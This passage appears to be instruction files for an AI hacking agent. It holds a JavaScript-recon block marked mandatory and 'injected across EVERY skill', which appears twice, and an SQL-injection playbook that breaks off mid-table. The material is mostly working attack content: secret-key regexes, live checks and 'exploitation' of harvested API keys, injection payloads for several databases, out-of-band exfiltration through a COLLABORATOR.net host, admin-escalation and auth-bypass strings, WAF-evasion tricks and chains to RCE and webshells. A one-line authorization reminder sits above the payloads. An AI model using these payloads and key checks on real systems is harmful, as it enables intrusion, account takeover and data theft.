`nuclei -t http/exposures/ -l js.txt`, `retire.js --js`, `whispers --target js_files/`.

### Secrets / Tokens (expanded — AI era keys included)
- **AWS** `AKIA…` access key + `aws_secret` 40-char key
- **GCP** `AIza[0-9A-Za-z\-_]{35}` + service-account JSON blob (`"type":"service_account"`)
- **OpenAI** `sk-[A-Za-z0-9]{48}` and project keys `sk-proj-[A-Za-z0-9_\-]{48,}`
- **Anthropic** `sk-ant-[A-Za-z0-9\-_]{95,}` — full Claude API key
- **HuggingFace** `hf_[A-Za-z0-9]{34,}` — model download + write access
- **Replicate** `r8_[A-Za-z0-9]{40}`
- **Stripe** `sk_live_[0-9a-zA-Z]{24,}` / `sk_test_…`
- **GitHub** `ghp_[A-Za-z0-9]{36}` / `github_pat_[A-Za-z0-9_]{82}`
- **Slack** `xox[baprs]-…` / webhook `hooks.slack.com/services/…`
- **SendGrid** `SG.[A-Za-z0-9_\-]{22}.[A-Za-z0-9_\-]{43}`
- **Twilio** `AC[a-zA-Z0-9]{32}` SID + auth token
- **JWTs** `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
- **Basic auth blobs** `Authorization: Basic [A-Za-z0-9+/=]{20,}`
- **OAuth** `client_id` + `client_secret` pairs
- **Firebase config** (`apiKey`, `authDomain`, `projectId` object)
- **Algolia admin key** `[A-Za-z0-9]{32}` with `adminApiKey` label
- **Mapbox** `sk.[A-Za-z0-9]{80,}`
- **Datadog** `DD_API_KEY` / `datadog-[A-Za-z0-9]{32}`
- **Intercom** `[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-…` with `intercom` context
- **Shopify** `shpss_[A-Za-z0-9]{32}` / `shpat_[A-Za-z0-9]{32}`
- **Vercel** `vc_[A-Za-z0-9]{32,}` / `VERCEL_TOKEN`
- **Netlify** `netlify-[A-Za-z0-9\-_]{40}`
- **New Relic** `NRAK-[A-Za-z0-9]{27}` license key
- **PEM private keys** `-----BEGIN (RSA |EC )?PRIVATE KEY-----`

### Hidden / Internal / Staging Endpoints
Every endpoint in JS is an UNTESTED endpoint. Real payout pattern: `/api/v2/internal/users`
recovered from obfuscated JS → full user DB → $25k. Also hunt:
- **WebSocket/SSE** `ws://`, `wss://`, `/subscribe`, `/stream`, `/sse`, `/events` — WS endpoints
  skip HTTP auth middleware and are frequently unprotected
- **GraphQL subscriptions** `subscription {`, `/subscriptions`, `/graphql-ws`
- **Deprecated v1 APIs** when v2 added auth — the old version often still runs
- **`window.__NEXT_DATA__`** — Next.js SSR embeds server-side API responses verbatim in HTML;
  often contains auth tokens, session data, internal API base URLs, and user PII
- **`window.__NUXT__`** — same problem on Nuxt apps
- **`window.__remixContext`** — Remix loader data embedded in HTML

### Client-Side Auth & Roles
`isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`, `atob(token)`,
`localStorage.setItem('admin',…)`, `featureFlags`, `canAccess`, `tier === 'enterprise'`.
Any UI/route gated ONLY client-side → call the endpoint directly with a low-priv token.

### Hidden Routes & Feature Flags
Dump SPA router table (React Router / Vue Router / Angular / Next.js pages directory).
Visit admin/beta/internal routes the nav never links. Flip feature flags (`localStorage`,
`?feature=`, cookie, JSON config, LaunchDarkly/Statsig/Split client keys) to unlock
ungated functionality.

### DOM XSS Sinks
`innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout("…")`,
jQuery `$()`, `.html()`, `dangerouslySetInnerHTML`, `v-html`, Angular `bypassSecurityTrustHtml`;
sources `location.hash/search/href`, `postMessage`, `document.referrer`, `window.name` → trace source→sink.

### Prototype Pollution
`__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`, query-string parsers,
`qs.parse`/`querystring.parse` feeding into merge → gadget chain to XSS/RCE.

### Cloud & 3rd-party Refs
`*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
`*.blob.core.windows.net`, `cloudfront.net`, `*.digitaloceanspaces.com`,
`supabase.co`, `*.neon.tech`, `*.planetscale.com` → test misconfig + takeover.

### postMessage Without Origin Check
`addEventListener('message',…)` with no `e.origin` check → cross-origin data theft / DOM XSS.

### Dependency CVEs
Map bundled lib versions to OSV/Snyk (`retire.js`). One bundled vulnerable lodash / axios /
DOMPurify / jQuery / Next.js = your bug. **2025 critical:** Next.js CVE-2025-29927
(middleware auth bypass via `x-middleware-subrequest` header — any Next.js ≤ 15.2.2).

### Historical / Version Diffing
Pull OLD JS from Wayback, diff vs live. Secrets and endpoints "removed" from current JS are
frequently STILL LIVE server-side; forgotten APIs survive in old bundles.

### Obfuscation as a Red Flag
Heavy obfuscation (`eval(function(p,a,c,k,e,d)`, string arrays, hex strings, `_0x` var names)
signals the developer was trying to hide something. Deobfuscate with `webcrack` / `synchrony` /
`de4js` and READ — the payoff rate on obfuscated code is higher than on readable code.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **AI API key** → call the provider's identity/model-list endpoint:
  `curl -s https://api.openai.com/v1/models -H "Authorization: Bearer $KEY"` → 200 = live.
  `curl -s https://api.anthropic.com/v1/models -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01"` → 200 = live.
- **`window.__NEXT_DATA__`** → curl the page without JS (`curl -sL https://HOST/page`) and
  parse the JSON blob from the HTML — if it contains session tokens or user PII, that's a finding.
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome (Playwright preferred over Selenium);
  screenshot the alert/exfil.
- **WebSocket endpoint** → connect with `wscat`/`websocat` without auth header; send a probe message.
- **Next.js middleware bypass** → add `x-middleware-subrequest: middleware:middleware:middleware`
  header to any request behind a Next.js middleware guard; 200/data = CVE-2025-29927 confirmed.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

**Only then write the report.** No "could potentially" — prove it or drop it.

---


<!-- MANDATORY-JS-RECON-DOCTRINE v1 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, and source map leaks endpoints, secrets, roles, feature flags, and business logic
> the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — The three crawlers are MANDATORY on EVERY live host

Run **all three** — never just one, never "pick your favourite." Enumerate subdomains first,
then run this per host (each subdomain can ship its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | grep -iE '\.js(\?|$)' | anew js.txt
echo "$HOST" | gau --subs   | grep -iE '\.js(\?|$)' | anew js.txt   # gauplus --subs = same

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -silent | grep -iE '\.js(\?|$)' | anew js.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null | grep -iE '\.js'     | anew js.txt
gospider  -s "https://$HOST" -d 3 --js 2>/dev/null  | grep -oE 'https?://\S+\.js' | anew js.txt
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with Burp/mitmproxy inline. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every chunk pulled on navigation
  goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a route you never
  visited = a bundle you never saw = bugs you never found.
- Toggle every feature you can and note the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** run passively while you browse — enable both.

---

## RULE 2 — Recover, beautify, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do curl -so /dev/null -w "%{http_code} $u.map\n" "$u.map"; done < js.txt | grep '^200'
sourcemapper -url "https://$HOST/static/main.js.map" -output ./recovered/   # or unwebpack / webcrack

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* 2>/dev/null | head -50
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end.** No exception for hundreds of files across dozens of hosts — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/` (verifies
live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`, `SecretFinder -i <f> -o cli`,
`LinkFinder -i beautified/ -o cli`, `xnLinkFinder`, `nuclei -t http/exposures/ -l js.txt`, `retire.js --js`.

- **Secrets / tokens** — AWS `AKIA…`, GCP `AIza…`, Stripe `sk_live_`, GitHub `ghp_`/`github_pat_`,
  Slack `xox…`, SendGrid `SG.`, Twilio `AC…`, JWTs `eyJ…`, `Authorization: Basic` blobs,
  `client_id`+`client_secret`, Firebase config, Algolia **admin** key, Mapbox `sk.`, private PEM keys.
- **Hidden / internal / staging endpoints** — every endpoint in JS is an UNTESTED endpoint. Grep
  `/api/`, `/internal/`, `/admin/`, `/graphql`, `v1|v2|v3`, `*-dev|staging|uat|sandbox`. Real payout
  pattern: `/api/v2/internal/users` recovered from obfuscated JS → full user DB → $25k.
- **Client-side auth & roles** — `isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`,
  `atob(token)`, `localStorage.setItem('admin',…)`. Any UI/route gated ONLY client-side is a
  BAC/BFLA lead — call the endpoint directly with a low-priv token.
- **Hidden routes & feature flags** — dump the SPA router table (React Router / Vue Router / Angular
  route config) from the bundle → visit admin/beta/internal routes the nav never links. **Flip
  feature flags** (`localStorage`, `?feature=`, cookie, JSON config) to unlock ungated functionality.
- **Hardcoded IDs / IDOR seeds** — UUIDs and numeric `userId/orgId/accountId` belonging to other
  tenants → cross-tenant test material.
- **DOM XSS sinks** — `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`,
  `setTimeout("…")`, jQuery `$()`, `.html()`; sources `location.hash/search/href`, `postMessage`,
  `document.referrer` → trace source→sink.
- **Prototype pollution** — `__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`,
  query-string parsers → gadget chain to XSS/RCE.
- **Cloud & 3rd-party refs** — `*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
  `*.blob.core.windows.net`, `cloudfront.net` → test bucket/Firebase/Firestore misconfig + takeover.
- **postMessage** — `addEventListener('message',…)` with no origin check → cross-origin data theft / DOM XSS.
- **Dependency CVEs** — map bundled lib versions to OSV/Snyk (`retire.js`, `nuclei` tech-detect).
  One bundled vulnerable lodash / axios / DOMPurify / jQuery = your bug.
- **Historical / version diffing** — pull OLD JS from Wayback and **diff vs live**. Secrets and
  endpoints "removed" from current JS are frequently STILL LIVE server-side; forgotten APIs survive
  in old bundles.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome; screenshot the alert/exfil.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

**Only then write the report.** No "could potentially" — prove it or drop it.

---


# SQLi Hunter Agent — Elite SQL Injection Methodology

> **Scope reminder**: Always verify authorization before testing any live target. This skill is for authorized pentests, bug bounty programs in-scope, and CTFs only.

---

## PHASE 0 — READ BEFORE STARTING

Read the relevant reference files based on the target type:
- **Web app** → `references/web-sqli.md`
- **Android / Mobile** → `references/android-sqli.md`
- **REST / GraphQL API** → `references/api-sqli.md`
- **NoSQL (MongoDB etc.)** → `references/nosql-injection.md`
- **WAF present / payloads blocked** → `references/waf-bypass.md`
- **Payload library** → `payloads/master-payload-list.md`
- **Non-time-based SQLi (error/UNION/boolean/OOB/stacked/second-order) + NoSQL (MongoDB/Redis/CouchDB/Cassandra/DynamoDB/Firebase/Supabase) + WAF bypass (curl-based, hardened system grade)** → `~/.claude/skills/js-recon-agent/references/14-sqli-nosql-injections.md`
- **LDAP · XPath · SSTI · XXE · Command injection + Supabase/Firebase/AI-ML unauth** → `~/.claude/skills/js-recon-agent/references/15-other-injections-and-unauth.md`

Then follow the MASTER WORKFLOW below.

---

## MASTER WORKFLOW (The Kill Chain)

### STEP 1 — RECON & SURFACE MAPPING

**Goal**: Find every injectable parameter — don't assume, enumerate.

**Attack Surface Checklist**:
```
GET/POST parameters          → id=, search=, q=, filter=, sort=, page=
URL path segments            → /user/123, /product/electronics
HTTP Headers                 → X-Forwarded-For, User-Agent, Referer, Cookie, X-Custom-*
JSON body keys               → {"username":"...", "filter":{...}}
XML body                     → <id>...</id>
GraphQL variables            → query { user(id: "...") }
Multipart form fields        → file upload metadata, filename=
Order/sort parameters        → orderBy=name, sortDir=asc
Search/filter fields         → especially ORM-built queries
Pagination params            → limit=, offset=, page=
Authentication params        → username, password, token, remember_me
Registration/profile fields  → username, email, address (→ 2nd order!)
Password reset tokens
Android: SharedPreferences, SQLite queries, ContentProvider URIs
API: route parameters, query strings, request body, auth headers
```

**Token-efficient recon tools** (use in this order, stop when surface found):
```bash
# Fast URL + param discovery
gau --subs TARGET | grep -E '\?.*=' | uro | tee params.txt
waybackurls TARGET | grep '=' | uro >> params.txt
katana -u https://TARGET -d 5 -jc -ef png,jpg,css -o katana.txt

# Extract parameters
cat params.txt | grep -oP '[?&][^=&]+(?==)' | sort -u

# JS endpoint mining (feeds into 2nd order discovery)
cat katana.txt | grep '\.js$' | jsluice urls | grep -E '\?.*='

# For Android: extract SQLite query strings from APK
jadx -d output/ target.apk && grep -r "rawQuery\|execSQL\|query(" output/ --include="*.java"
```

---

### STEP 2 — FINGERPRINT FIRST (Smart, Not Hard)

**Rule**: Never fire a full payload set blind. Fingerprint the DBMS first with minimal probes.

**Probe sequence** (use Burp Repeater / curl):

```
Step 1 — Break the query (detect injection point type):
  '              → string context
  "              → alternate string delimiter  
  `              → MySQL backtick context
  )              → close parenthesis context
  ')             → string + paren
  1' AND '1'='1  → string boolean
  1 AND 1=1      → numeric boolean
  1;--           → stacked query attempt

Step 2 — Confirm with benign boolean:
  1 AND 1=1--    → should behave NORMALLY
  1 AND 1=2--    → should behave DIFFERENTLY (no data / error)
  If both same → blind/filtered; escalate to time-based

Step 3 — DBMS fingerprint via error messages OR timing:
  MySQL:      ' AND extractvalue(1,concat(0x7e,version()))--
  MSSQL:      ' AND 1=CONVERT(int,@@version)--
  PostgreSQL: ' AND 1=cast(version() as int)--
  Oracle:     ' AND 1=utl_inaddr.get_host_address(version)--
  SQLite:     ' AND 1=CAST(sqlite_version() AS INT)--

Step 4 — If no visible error, try time-based DBMS probe:
  MySQL:      ' AND SLEEP(3)--
  MSSQL:      '; WAITFOR DELAY '0:0:3'--
  PostgreSQL: ' AND pg_sleep(3)--
  Oracle:     ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--
  SQLite:     (no native sleep; use heavy query instead)
```

**STOP**: After fingerprint, you know:
- Injection point location (param / header / body key)
- Context (string / numeric / blind / error-visible)
- DBMS type

Now proceed to the matching exploitation path.

---

### STEP 3 — EXPLOIT (By Type)

#### 3A — ERROR-BASED (fastest data extraction when visible)

**MySQL** (extractvalue / updatexml):
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)--
```

**MSSQL** (CONVERT trick):
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
' AND 1=CONVERT(int,(SELECT TOP 1 CAST(username+':'+password AS NVARCHAR) FROM users))--
```

**PostgreSQL** (CAST):
```sql
' AND CAST((SELECT version()) AS INT)=1--
' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)=1--
' AND 1=(SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Oracle** (XMLType / UTL):
```sql
' AND 1=2 UNION SELECT XMLType('<x>'||(SELECT banner FROM v$version WHERE rownum=1)||'</x>') FROM dual--
' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
```

#### 3B — UNION-BASED (when output is reflected)

```sql
-- Step 1: Find column count
ORDER BY 1--   (increment until error → N-1 is column count)
UNION SELECT NULL--
UNION SELECT NULL,NULL--   (repeat until no error)

-- Step 2: Find printable column
UNION SELECT NULL,'SQLI_TEST',NULL--   (look for string in response)

-- Step 3: Extract data
UNION SELECT NULL,database(),NULL--
UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 1--
```

#### 3C — BLIND BOOLEAN-BASED (no visible output, no errors)

Use binary search pattern to extract data character by character:

```sql
-- Confirm blind:
1 AND 1=1--  (normal)   vs   1 AND 1=2--  (different)

-- Extract DB name length:
1 AND (SELECT LENGTH(database()))>5--

-- Extract DB name char by char (binary search):
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>77--
1 AND ASCII(SUBSTRING((SELECT database()),1,1))=109--  → 'm'

-- Complex boolean payload (nav1n0x style):
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Automate blind extraction** with sqlmap AFTER manual confirmation:
```bash
sqlmap -u "URL?id=1*" --level=5 --risk=3 --technique=B --dbms=mysql --batch --dbs
```

#### 3D — TIME-BASED BLIND (most stealthy, async-safe)

**Critical insight**: If an app processes params asynchronously (background threads, analytics logging), time-based may **fail silently** even on vulnerable params. Always try OOB next.

```sql
-- MySQL (confirm with 3s delay):
1' AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>77,SLEEP(3),0)--

-- MSSQL:
'; IF (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 WAITFOR DELAY '0:0:3'--

-- PostgreSQL:
'; SELECT CASE WHEN (LENGTH(current_database())>1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- Oracle:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),3)--

-- Complex nav1n0x time-based:
' AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>77,SLEEP(5),0)--
```

#### 3E — OUT-OF-BAND / OAST (async targets, $20k-earning technique)

> Use when time-based fails but param is likely vulnerable. Detects async SQLi, second-order, and logging injections. Use Burp Collaborator or interactsh.

```sql
-- MySQL (DNS):
LOAD_FILE(concat('\\\\',database(),'.COLLABORATOR.net\\a'))
' UNION SELECT LOAD_FILE(concat(0x5c5c5c5c,(SELECT database()),0x2e,0x434f4c4c41424f5241544f52,0x2eNET,0x5c61))--

-- MSSQL (DNS via xp_dirtree):
'; exec master..xp_dirtree '//'+@@version+'.COLLABORATOR.net/a'--

-- PostgreSQL (DNS via COPY):
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.COLLABORATOR.net'--

-- Oracle (DNS via UTL_HTTP):
' UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--
```

**Strategy**: Unique subdomain per parameter tested → precise source tracking in Collaborator logs.

---

### STEP 4 — SECOND-ORDER SQLi (most missed, highest signal-to-noise)

**Attack vectors** (store malicious input, trigger later):
```
Registration → username, display name, bio
Profile update → address, company, email
Referral/invite codes
Password change → old password field
File upload → filename metadata
API: PUT /users/{id} with payload in body fields
```

**Payloads to store**:
```sql
admin'--
' OR 1=1--
attacker'; UPDATE users SET role='admin' WHERE username='attacker'--
test' UNION SELECT NULL,password,NULL FROM users--
```

**Trigger flow**:
1. Store payload in registration/profile
2. Perform action that retrieves and uses that field in a new SQL query (password reset, admin panel lookup, search by stored value)
3. Observe delayed error/behavior change

**Source code signals** (white-box):
```python
# Dangerous patterns (stored value used raw in query):
cursor.execute(f"SELECT * FROM users WHERE username = '{stored_value}'")
db.query("SELECT * FROM orders WHERE customer = '" + username_from_db + "'")
```

---

### STEP 5 — AUTH BYPASS

```sql
-- Classic:
admin'--
admin'/*
' OR 1=1--
' OR '1'='1
' OR 1=1#
') OR ('1'='1
' OR 'x'='x

-- Username field specific:
admin'--
admin'#
') OR 1=1--
' OR 1=1 LIMIT 1--

-- Login form (both fields controlled):
username: admin'--  password: anything
username: ' OR 1=1-- password: anything

-- Hash bypass (MSSQL):
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

---

### STEP 6 — NoSQL INJECTION (MongoDB focus)

```javascript
// Auth bypass via operator injection (JSON body):
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// $where JavaScript injection (when enabled):
{"$where": "sleep(5000); return true;"}
{"$where": "function(){ return this.username == 'admin'; }"}

// Blind NoSQL extraction via regex:
{"username": {"$regex": "^a"}, "password": {"$exists": true}}
{"username": {"$regex": "^ad"}, "password": {"$exists": true}}
// (iterate regex prefix to extract character-by-character)

// URL-encoded (GET params):
?username[$ne]=x&password[$ne]=x
?username[$regex]=^admin&password[$ne]=x
?filter[$where]=sleep(5000)

// Array injection:
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": null}}
```

**Timing attack on MongoDB**:
```javascript
{"username": "admin", "password": {"$regex": "^a.*", "$options": "i"}}
// If response delays → character matches → build password character-by-character
```

---

### STEP 7 — API & GRAPHQL SQLi

**REST API injection surfaces**:
```
GET /api/users?id=1 UNION SELECT...
GET /api/search?q=test' OR 1=1--
POST /api/login  body: {"user":"admin'--","pass":"x"}
GET /api/products?sort=name; DROP TABLE--
GET /api/v2/items/1' OR '1'='1
X-User-ID: 1 UNION SELECT...
```

**GraphQL injection**:
```graphql
# Inject in argument values:
{ user(id: "1 UNION SELECT username,password FROM users--") { name } }
{ search(query: "test' OR 1=1--") { results } }

# Introspection first to map schema:
{ __schema { types { name fields { name } } } }
```

**Android ContentProvider injection**:
```java
// Vulnerable pattern:
Cursor c = db.rawQuery("SELECT * FROM data WHERE id=" + uri.getLastPathSegment(), null);

// Test via ADB:
adb shell content query --uri content://com.target.app.provider/users/1%20OR%201=1
adb shell content query --uri "content://com.target.app/items/1' UNION SELECT name,sql,null FROM sqlite_master--"
```

---

### STEP 8 — WAF BYPASS (when payloads are blocked)

**Bypass decision tree** (try in order, stop when one works):

```
1. CASE MIXING:        uNioN SeLecT
2. INLINE COMMENTS:    UN/**/ION/**/SEL/**/ECT
3. URL ENCODING:       %27 (') %20 (space) %23 (#)
4. DOUBLE ENCODING:    %2527 (%27 double-encoded)
5. WHITESPACE SUBS:    UNION%0ASELECT / UNION%09SELECT / UNION%0DSELECT
6. HEX ENCODING:       0x61646D696E (hex for 'admin')
7. CHAR FUNCTION:      CHAR(65)||CHAR(100)||CHAR(109)
8. STRING CONCAT:      'ad'||'min' / 'ad'+'min' / concat('ad','min')
9. SCIENTIFIC:         1e0 instead of 1
10. NEGATIVE INDEX:    /*!50000UNION*//*!50000SELECT*/
11. HPP (param):       ?id=1&id=UNION+SELECT--
12. CHUNKED ENCODING:  Transfer-Encoding: chunked (split payload across chunks)
13. JSON UNICODE:      {"user": "\u0061dmin'--"}
14. BASE64 (MySQL):    FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ==')
```

**WAF-specific cheat payloads**:
```sql
-- Cloudflare bypass:
' /*!UNION*/ /*!SELECT*/ NULL,NULL--
%27+UNION+SELECT+NULL,NULL--

-- ModSecurity bypass:
'/*! UNION *//*! SELECT */NULL--

-- Akamai bypass:
1+UNION+SELECT+0x61646d696e,0x70617373--

-- Generic comment combo:
' UNION/**/SELECT/**/NULL,/**/NULL/**/--

-- Newline in keyword:
UNION
SELECT NULL--
```

---

### STEP 9 — FALSE POSITIVE ELIMINATION

**Critical checks before reporting**:

| Observation | False Positive Check |
|-------------|---------------------|
| Sleep delay occurred | Re-test 3x — is delay consistent? Network jitter? |
| Error message appeared | Is error from app logic (not DB)? Check non-SQL input |
| Boolean diff in response | Is diff meaningful (data change) or cosmetic (whitespace)? |
| OOB callback received | Is SSRF also possible without SQLi? |
| UNION output returned | Is it reflected from input or actual DB data? |

**Confirming TRUE POSITIVE**:
```
1. Boolean proof: both AND 1=1 (normal) AND AND 1=2 (different) must hold
2. Time proof: delay must be consistent and proportional (SLEEP(3) ≈ 3s, SLEEP(6) ≈ 6s)
3. Data proof: extract benign DB value (version(), database()) — never exfiltrate real PII
4. WAF false error: inject benign string that looks like SQL → no error? Then the error is from DB
```

---

### STEP 10 — CHAINING SQLi WITH OTHER BUGS

**High-value SQLi chains**:
```
SQLi → Auth Bypass → Admin Panel Access → RCE
SQLi → User Enumeration → Password Hash Dump → Account Takeover
SQLi (LOAD_FILE) → LFI/File Read
SQLi (INTO OUTFILE) → RCE / Webshell write
SQLi → SSRF via OOB DNS/HTTP callbacks
SQLi → Privilege Escalation (UPDATE role/is_admin)
SQLi + IDOR → Horizontal Privilege Escalation
SQLi + CSRF → Stored Auth Bypass
Second-Order SQLi → Blind XSS equivalent pattern (store → trigger admin action)
NoSQL Injection → Authentication Bypass → JWT Manipulation
```

---

### STEP 11 — PoC & REPORTING

**Minimum PoC requirements**:
```
1. Exact HTTP request (redacted sensitive data)
2. Payload used (URL-decoded)
3. DBMS confirmed (version string or timing proof)
4. What data was extracted (use database()/version() only — no PII)
5. Screenshot or response diff showing vulnerability
6. CVSS score estimate:
   - SQLi with data extraction → CVSS 9.8 (Critical)
   - Blind SQLi → CVSS 8.8+ (High-Critical)
   - Auth bypass SQLi → CVSS 9.8 (Critical)
7. Remediation: parameterized queries, ORM usage, input validation
```

**Bug bounty report template**:
```
## Vulnerability: SQL Injection ([Type]) in [Endpoint]
**Severity**: Critical / High
**CVSS**: 9.8

### Summary
[One-line description]

### Steps to Reproduce
1. Navigate to [URL]
2. Intercept request with Burp Suite
3. Modify [parameter] to: [payload]
4. Observe [response / delay / DNS callback]

### Impact
An attacker can [extract all DB data / bypass auth / achieve RCE].

### Proof of Concept
[HTTP Request screenshot]
[Response showing database() = 'targetdb']

### Remediation
Use parameterized queries or prepared statements.
```

---

## TOOLCHAIN (Efficiency-ranked)

```
Phase          Tool                    Purpose
─────────────────────────────────────────────────────────
Recon          gau, waybackurls, katana  URL + param discovery
Surface        ParamSpider, JSluice    JS endpoint + param mining
Interception   Burp Suite              Manual testing, Repeater, Intruder
DBMS ID        Manual probes (curl)    Fingerprint before tooling
OOB/OAST       Burp Collaborator / interactsh  Blind/async detection
Automation     sqlmap, ghauri          Post-confirmation extraction
Android        jadx, adb, drozer       APK reverse + ContentProvider test
Reporting      Markdown template       Structured bounty report
```

**sqlmap smart usage** (post-manual confirmation only):
```bash
# Basic:
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# With custom header injection:
sqlmap -u "https://target.com/" --headers="X-Forwarded-For: *" --level=5 --risk=3

# POST body:
sqlmap -u "https://target.com/login" --data="user=admin&pass=x" -p user

# Custom tamper for WAF:
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch

# Second-order:
sqlmap -u "https://target.com/profile" --second-url="https://target.com/admin/users"

# Ghauri (faster, WAF-bypass native):
ghauri -u "https://target.com/page?id=1" --dbs --level=3
```

---

## QUICK REFERENCE — DBMS CHEATSHEET

| Feature | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---------|-------|-------|------------|--------|--------|
